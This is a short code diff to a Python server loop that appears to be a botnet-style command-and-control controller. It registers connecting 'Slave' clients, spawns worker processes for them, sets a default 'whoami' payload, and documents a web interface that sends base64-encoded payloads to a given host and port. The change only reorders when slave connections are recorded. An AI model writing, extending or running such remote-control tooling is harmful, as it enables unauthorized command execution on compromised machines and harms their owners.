@@ -90,14 +90,18 @@ while True:
                 'connected_at': datetime.now(),
                 'uptime': 0
             }
-            connections.append(conn)
 
         payload = b'whoami'
 
         connections = [conn for conn in connections if utilities._check_conn(conn)]
 
         data = connection.recv(1024).decode('utf-8')
-        if data.startswith('GET / '):
+        # slave connected
+        if data.startswith('Slave'):
+            connections.append(conn)
+            worker_process = multiprocessing.Process(target=_worker_process, args=(connection,))
+            worker_process.start()
+        elif data.startswith('GET / '):
             # payload URLs: POST /b64<payload>?b64<host:port>
             # add payload input field
             print(f'Web interface Request data: << {data}')
@@ -155,10 +159,6 @@ while True:
             connection.close()
         elif data.startswith('GET'):
             print(f'Request data: << {data}')
-        # slave connected
-        elif data.startswith('Slave'):
-            worker_process = multiprocessing.Process(target=_worker_process, args=(connection,))
-            worker_process.start()
             # _worker_process(connection)
         elif not data: #break  # else?
             pass
